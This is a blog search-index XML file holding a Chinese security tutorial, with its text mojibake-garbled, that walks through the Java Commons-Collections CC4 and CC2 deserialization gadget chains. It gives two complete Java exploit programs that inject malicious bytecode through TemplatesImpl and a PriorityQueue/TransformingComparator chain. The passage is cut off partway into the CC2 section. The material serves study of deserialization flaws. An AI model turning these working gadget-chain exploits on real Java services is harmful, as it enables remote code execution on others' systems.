<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-CC4&amp;CC2&amp;CC5&amp;CC7é“¾</title>
    <link href="/2025/09/15/Java%E5%AE%89%E5%85%A8-CC4&amp;CC2&amp;CC5&amp;CC7%E9%93%BE/"/>
    <url>/2025/09/15/Java%E5%AE%89%E5%85%A8-CC4&amp;CC2&amp;CC5&amp;CC7%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-CC4é“¾"><a href="#Javaå®‰å…¨-CC4é“¾" class="headerlink" title="Javaå®‰å…¨-CC4é“¾"></a>Javaå®‰å…¨-CC4é“¾</h1><h1 id="CC4é“¾"><a href="#CC4é“¾" class="headerlink" title="CC4é“¾"></a>CC4é“¾</h1><p>å› ä¸º CommonsCollections4 é™¤ 4.0 çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–ã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>å…ˆè¯´ä¸€ä¸‹ jdk è¿™ä¸ªç¯å¢ƒï¼Œç†è®ºä¸Šåªæœ‰ CC1 å’Œ CC3 é“¾å—åˆ° jdk ç‰ˆæœ¬å½±å“ã€‚</p><ul><li><p>JDK8u65</p></li><li><p>[openJDK 8u65</p></li><li><p>Maven 4.0.0</p></li><li><p>Commons-Collections 4.0</p></li></ul><p>Maven ä¸‹è½½ Commons-Collections ä¾èµ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;  <br> &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;  <br> &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;  <br> &lt;version&gt;<span class="hljs-number">4.0</span>&lt;/version&gt;  <br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h2 id="CC4-é“¾åˆ†æ"><a href="#CC4-é“¾åˆ†æ" class="headerlink" title="CC4 é“¾åˆ†æ"></a>CC4 é“¾åˆ†æ</h2><blockquote><p>å› ä¸ºè¿˜æ˜¯ CC é“¾çš„æ¼æ´ï¼Œæ‰€ä»¥ä¸€èˆ¬æ˜¯ä¸ <code>transform</code> åˆ†ä¸å¼€çš„ã€‚</p></blockquote><ul><li>ä»å°¾éƒ¨å‘é¦–éƒ¨åˆ†æï¼Œå°¾éƒ¨å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼å°±ä¸¤ç§ï¼Œåå°„æˆ–æ˜¯åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚å› ä¸º CC4 é“¾ä¸Šåªæ˜¯å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œæ‰€ä»¥æœ€åçš„å‘½ä»¤æ‰§è¡Œä¸å—å½±å“ã€‚</li></ul><p>è¿™é‡Œçš„ InvokerTransformer ç”¨ä¸äº†äº†ï¼Œæˆ‘ä»¬å»æ‰¾è°è°ƒç”¨äº† <code>transform()</code> æ–¹æ³•</p><p>æ‰¾åˆ°TransformingComparatorçš„compareæ–¹æ³•</p><p><img src="/img/CC4/c01.png"></p><p>compareæ–¹æ³•æŸ¥æ‰¾ç”¨æ³•æ—¶æ˜¯æœ‰133ä¸ªç»“æœçš„ï¼Œå¾ˆéš¾æ’æŸ¥</p><p>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç»§ç»­å¯»æ‰¾æ–¹æ³•è°ƒç”¨çš„æ—¶å€™éœ€è¦ä¸€äº›ç¼–ç¨‹åŸºç¡€çš„</p><p>è¿™é‡Œç›´æ¥çœ‹åˆ°PriorityQueueçš„readObjectæ–¹æ³•</p><p>è°ƒç”¨äº†heapifyæ–¹æ³•</p><p><img src="/img/CC4/c02.png"></p><p>heapifyæ–¹æ³•è°ƒç”¨äº†siftDownæ–¹æ³•(è¿™é‡Œä¸è´´å‡º)</p><p>ç»§ç»­èµ°åˆ°siftDownæ–¹æ³•æ–¹æ³•</p><p><img src="/img/CC4/c04.png"></p><p>èµ°è¿›ifå¾ªç¯å‘ç°siftDownUsingComparatoræ–¹æ³•æœ‰compareæ–¹æ³•çš„è°ƒç”¨</p><p><img src="/img/CC4/c05.png"></p><h2 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œå‘ç°æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ä¹Ÿæ²¡æœ‰æŠ¥é”™</p><p>åœ¨readObjectä¸‹ä¸€ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹</p><p>æ–­åœ¨795è¡Œï¼Œè°ƒç”¨heapifyæ–¹æ³•æ—¶ä¸‹ä¸€ä¸ªæ–­ç‚¹</p><p>çœ‹åˆ°è¿™é‡Œå‘ç°size&#x3D;0æ˜¯æ— æ³•è¿›å…¥siftDownæ–¹æ³•çš„</p><p><img src="/img/CC4/c06.png"></p><p>åœ¨readObjectæ–¹æ³•ä¸­æœ‰å…³äºsizeçš„ä»£ç </p><p><img src="/img/CC4/c07.png"></p><p>ä¿®æ”¹EXP</p><p>è¦ä¿®æ”¹ Sizeï¼Œå¿…ç„¶è¦å…ˆæ˜ç™½ Size æ˜¯ä»€ä¹ˆï¼ŒSize å°±æ˜¯ PriorityQueue è¿™ä¸ªé˜Ÿåˆ—çš„é•¿åº¦ï¼Œç®€å•ç†è§£ï¼Œå°±æ˜¯æ•°ç»„çš„é•¿åº¦ã€‚ç°åœ¨æˆ‘ä»¬è¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º 0ï¼Œ0 - 1 &#x3D; -1ï¼Œæ‰€ä»¥ä¼šç›´æ¥è·³å‡ºå¾ªç¯ï¼Œä¸èƒ½å¼¹è®¡ç®—å™¨ã€‚</p><p>é€šè¿‡æ­¤è¯­å¥åŠ ä¸Šå³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(<span class="hljs-number">1</span>);  <br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹æ˜¯èƒ½å¼¹è®¡ç®—å™¨çš„ï¼Œä½†æ˜¯æŠ¥é”™äº†</p><p>åŸå› æ˜¯ï¼š</p><p>åœ¨æˆ‘ä»¬è¿›è¡Œ <code>priorityQueue.add(1)</code> è¿™ä¸ªè¯­å¥çš„æ—¶å€™ï¼Œå®ƒå†…éƒ¨ä¼šè‡ªåŠ¨è¿›è¡Œ <code>compare()</code> æ–¹æ³•çš„æ‰§è¡Œï¼Œç„¶åè°ƒç”¨ <code>transform()</code>ï¼Œè§¦å‘æˆ‘ä»¬çš„chainedTransformerç»„åˆé“¾ã€‚è¿˜æ²¡æœ‰åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œå°±å¼¹å‡ºè®¡ç®—å™¨äº†</p><p>ä½†æ˜¯åœ¨è¿™é‡Œç”±äº <code>_tfactory</code> ä¸º nullï¼Œå¯¼è‡´æŠ¥é”™ã€‚</p><p>è¿˜è®°å¾—æˆ‘ä»¬åœ¨ CC3 é“¾é‡Œé¢è®²çš„é‚£ä¸ª <code>_tfactory</code> çš„å€¼å—ï¼Ÿ</p><p>å½“æ—¶æˆ‘ä»¬æ˜¯å†™çš„è¿™æ®µ EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br>templates.newTransformer();<br></code></pre></td></tr></table></figure><ul><li>æˆ‘åœ¨è·‘ä»£ç çš„æ—¶å€™æŠŠæœ€åä¸€è¡Œç»™æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥æ‰ä¼šå‡ºé”™ã€‚<code>_tfactory</code> æ˜¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰ä¼šåŠ è¿›æ¥çš„ï¼Œæ‰€ä»¥åŠ ä¸Šå°±ä¸æŠ¥é”™äº†ã€‚ä¸è¿‡åˆ æ‰ä¹Ÿæ— æ‰€è°“ï¼Œå› ä¸ºæˆ‘ä»¬æœ¬æ¥å°±ä¸æƒ³è®©å…¶æœ¬åœ°æ‰§è¡Œã€‚</li></ul><p>åŒæ ·çš„ï¼Œæƒ³è¦è§£å†³è¿™ä¸ªæŠ¥é”™ï¼Œæˆ‘ä»¬åªéœ€è¦ç»™é“¾å­å…¶ä¸­ä¸€ä¸ªæ–¹æ³•ä¼ å…¥ä¸€ä¸ªæ²¡ç”¨çš„å¯¹è±¡ï¼Œå†ç”¨åå°„ä¿®æ”¹ï¼Œå°±å¯ä»¥äº†</p><p>è¿™é‡Œå°†è¿™è¡Œä»£ç åšæ›´æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>å…ˆä¼ å…¥ä¸€ä¸ªæ²¡æœ‰ç”¨çš„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>å†åå°„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>transformer.setAccessible(<span class="hljs-literal">true</span>);<br>transformer.set(transformingComparator, chainedTransformer);<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformer.setAccessible(<span class="hljs-literal">true</span>);<br>        transformer.set(transformingComparator, chainedTransformer);<br><br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/CC4/c08.png"></p><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p><img src="/img/CC4/c09.png"></p><h1 id="CC2é“¾"><a href="#CC2é“¾" class="headerlink" title="CC2é“¾"></a>CC2é“¾</h1><h2 id="åˆ†æä¸EXPç¼–å†™"><a href="#åˆ†æä¸EXPç¼–å†™" class="headerlink" title="åˆ†æä¸EXPç¼–å†™"></a>åˆ†æä¸EXPç¼–å†™</h2><p>CC2 è¿™æ¡é“¾å®é™…ä¸Šæ˜¯åœ¨ CC4 é“¾åŸºç¡€ä¸Šçš„ä¿®æ”¹ï¼Œç›®çš„æ˜¯ä¸ºäº†é¿å…ä½¿ç”¨ <code>Transformer</code> æ•°ç»„ã€‚</p><p>åœ¨ CC4 é“¾çš„åŸºç¡€ä¸Šï¼ŒæŠ›å¼ƒäº†ç”¨ <code>InstantiateTransformer</code> ç±»å°† <code>TrAXFilter</code> åˆå§‹åŒ–ï¼Œä»¥åŠ <code>TemplatesImpl.newTransformer()</code> è¿™ä¸ªæ­¥éª¤</p><p>çœ‹åˆ°äº†ä¸€ä¸ªæ€»ç»“çš„å¾ˆå¥½çš„æµç¨‹å›¾ï¼Œè´´åœ¨è¿™é‡Œ</p><p><img src="/img/CC4/c10.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬ç®€å•åˆ†æ CC2 é“¾çš„å‰åŠéƒ¨åˆ†ï¼Œè¿˜æ˜¯å‡ºç°äº† compare è¿™äº›ï¼Œæ‰€ä»¥åœ¨ CC4 é“¾ä¸­çš„ compare éƒ¨åˆ†æ˜¯å¯ç”¨çš„ã€‚åœ¨ CC2 